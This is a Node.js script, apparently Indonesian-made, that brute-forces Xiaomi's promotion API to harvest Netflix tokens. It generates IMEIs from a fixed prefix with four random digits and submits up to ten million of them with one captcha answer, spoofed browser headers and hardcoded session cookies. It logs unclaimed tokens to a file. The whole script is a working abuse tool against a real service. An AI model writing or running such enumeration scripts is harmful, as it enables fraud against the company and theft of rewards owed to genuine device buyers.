const fetch = require('node-fetch');
const fs = require('fs');
const uniqueRandom = require('unique-random');
const random = uniqueRandom(0, 9);
const readlineSync = require('readline-sync');
const chalk = require('chalk');
const acak = require('random');

console.log(`
    ██╗      █████╗ ███╗   ███╗██████╗ ██╗   ██╗██╗██╗  ██╗
    ██║     ██╔══██╗████╗ ████║██╔══██╗██║   ██║██║██║ ██╔╝
    ██║     ███████║██╔████╔██║██████╔╝██║   ██║██║█████╔╝ 
    ██║     ██╔══██║██║╚██╔╝██║██╔══██╗██║   ██║██║██╔═██╗ 
    ███████╗██║  ██║██║ ╚═╝ ██║██████╔╝╚██████╔╝██║██║  ██╗
    ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═╝
                                                       
`)
var usernames = readlineSync.question(`\n\n\n ENTER UNTUK GASS BOS..  `);
var uuid = `ab2d-e${acak.int(10, 99)}1-i${acak.int(10, 99)}k-a${acak.int(100, 999)}`;
var capcay = readlineSync.question(`\nInput Capcay Link https://hd.c.mi.com/my/eventapi/api/aptcha/index?type=netflix&uid=${uuid} \n\ncapcay : `);
console.log('GASSS......')

const imeichecker = (imeix) => new Promise((resolve, reject) => {
    fetch(`https://hd.c.mi.com/my/eventapi/api/netflix/gettoken?uid=${uuid}&vcode=${capcay}&imei=${imeix}`, {
        headers: {
            'Accept': 'application/json, text/plain, */*',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
            'Origin': 'https://event.mi.com',
            'Sec-Fetch-Site': 'same-site',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://event.mi.com/my/campaign2020/serie-mi-10-t',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cookie': '_ot_use_type=1; _ot_session_id=1609321870846; _ot_instance_id=cd9d55612d6af27cd8b12e7be272f0a9; _ot_last_source=; _ot_utm_type=; _ot_utm_channel=; _ot_utm_campaign=; _ot_utm_source=; _ot_utm_medium=; _ot_utm_term=; _ot_utm_content=; _ot_referrer_path=; _ot_prev_uri_path=; _ot_curr_uri_path=https://event.mi.com/my/campaign2020/serie-mi-10-t; _ot_ref_tip=; _ot_ref_b=46; _ot_last_time=1609321936987; mstuid=1609321870880_5070; msttime=https%3A%2F%2Fevent.mi.com%2Fmy%2Fcampaign2020%2Fserie-mi-10-t; _ga=GA1.2.2033096995.1609321871; _gid=GA1.2.1218985616.1609321871; xmuuid=XMGUEST-E2783266-CFD7-15EC-43AF-F02AD34152BD; mstz=||1270595409.2|||; xm_vistor=1609321870880_5070_1609321917051-1609321917161'

        }
    })
        .then(res => res.json())
        .then(res => {
            resolve(res);
            

        })
        .catch(err => {
            reject(err)
        })
});

(async () => {
    var readMe = 0;
    
    for (let i = 0; i < 10000000; i++) {
        readMe++
        var imeix = '86622805363' + random() + random() + random() + random();    
        const detailItems = await imeichecker(imeix);
        // console.log(readMe[i])
        // console.log(detailItems.info)
        hasil = detailItems.info
        if(detailItems.info =='vcode is expired.')
        {
            console.log(i+' | ' + hasil+' | ' + imeix)
        } else if(detailItems.info =='invalied imei') {
            console.log(i+' | ' + hasil+' | ' + imeix)
        } else if(detailItems.info =='invalied sales country') {
            console.log(i+' | ' + hasil+' | ' + imeix)
        } else {
            console.log(chalk.green(i+' => BELUM DIGUNAKAN ' + imeix))
            console.log(chalk.green(hasil));

            fs.appendFile('HASIL.txt', hasil + ' | ' + imeix + '\n', function (err) {
                if (err) throw err;
                console.log('Saved!');
            });

        }
        
        
    }
    console.log('done')
})();
